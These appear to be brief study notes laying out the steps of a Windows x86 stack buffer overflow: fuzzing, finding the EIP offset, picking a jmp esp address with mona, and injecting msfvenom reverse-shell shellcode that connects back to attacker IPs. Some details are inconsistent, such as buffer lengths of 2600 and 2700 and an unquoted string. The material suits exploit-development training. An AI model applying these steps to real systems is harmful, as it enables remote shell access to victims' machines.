# Bufferoverflow sequence/process

### 1. Fuzzing

Create script and send "A" for the payload size (2700, 3500 etc)

### 2. Replicate crash and identify the exact charset /bytes where the application gets crash

Use following commands to generate unique chars and offset value

```
/usr/share/metasploit-framwork/tools/pattern_create.rb 2700
/usr/share/metasploit-framwork/tools/pattern_offset.rb <EIP Address>  
```
### 3. Update script and check we can control both EIP and ESP register

```
buf += "A"*146 + "B"*4 + C*(2700-146-4)
```

### 4. Control ESP register and identify the bad characters 

Some of the bad characters are "\x00", "\x0a" etc

### 5. Identfify mona modules and choose the exact module (Without CSP and ASLR)

Choose a module does not contain memory protetcion such as ASLR and DEP -> It should be false
Memory range should not contain any bad character such as 00 and 0a (In our case here)
```
!mona modules 
```

Identify the memory address of jmp esp
configure this address in reverse order in the script, as it is x86 architecture
Eg: \x9d\xdc\x25\x77
```
Search jmp esp
buf += "A"*146 + "\x9d\xdc\x25\x77" + "C"*(2600-146-4)

```

### 6. Generating Shell code using msfvenom & removing bar chars

```
msfvenom --payload windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 --bad-chars '\x00\x0a' -f C

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.28.128 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a"
```

### 7. Update/inject this payload in the script
Along with payload, give some space to decode the code
```
buf += "A"*146 + "\x9d\xdc\x25\x77" + "\x90"*16 + shellcode + "C"*(2700-146-4-16-351)
```
